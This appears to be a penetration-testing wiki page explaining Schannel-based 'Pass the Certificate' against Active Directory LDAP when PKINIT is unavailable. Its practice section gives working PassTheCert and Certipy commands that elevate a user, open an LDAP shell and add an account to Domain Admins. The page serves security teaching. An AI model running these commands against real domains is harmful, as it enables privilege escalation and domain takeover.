---
authors: ShutdownRepo, ThePirateWhoSmellsOfSunflowers
category: ad
---

# Pass the Certificate

> [!NOTE]
> This technique extends the notion of [Pass the Certificate](../kerberos/pass-the-certificate.md), thus dubbed by myself, [@_nwodtuhs](https://twitter.com/_nwodtuhs/), in a Twitter thread about AD CS and PKINIT [here](https://twitter.com/_nwodtuhs/status/1451510341041594377). Even if both techniques share the same name and the same concept, the authentication method is different.

## Theory

Sometimes, Domain Controllers do not support [PKINIT](../kerberos/pass-the-certificate.md). This can be because their certificates do not have the `Smart Card Logon` EKU. Most of the time, domain controllers return `KDC_ERR_PADATA_TYPE_NOSUPP` error when the EKU is missing. Fortunately, several protocols — including LDAP — support Schannel, thus authentication through TLS. As the term "schannel authentication" is derived from the [Schannel SSP (Security Service Provider)](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview) which is the Microsoft SSL/TLS implementation in Windows, it is important to note that schannel authentication is a SSL/TLS client authentication.

> [!TIP]
> * Schannel authentication relies on TLS so it is, by design, not subject to channel binding, as the authentication is borne by TLS itself.
> * Schannel is not subject to LDAP signing either as the `bind` is performed after a StartTLS command when used on the LDAP TCP port.

## Practice

::: tabs

=== UNIX-like

Tools like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (python version) and [Certipy](https://github.com/ly4k/Certipy) can be used to authenticate with the certificate via Schannel against LDAP.

```bash
# If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:
$ certipy cert -pfx user.pfx -nokey -out user.crt
$ certipy cert -pfx user.pfx -nocert -out user.key

# elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)
passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate

# spawn a LDAP shell
passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell
```


=== Windows

Pass the cert technique can be done with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (C# version).

```bash
# Add simple_user to Domain Admins (it assumes that the domain account for which the certificate was issued, holds privileges to add user to this group)
.\PassTheCert.exe --server fqdn.domain.local --cert-path Z:\cert.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=domain,DC=local" --account "CN=simple_user,CN=Users,DC=domain,DC=local"
```

:::


## Resources

[https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

[Certified Pre-Owned (pdf)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

[https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

[https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)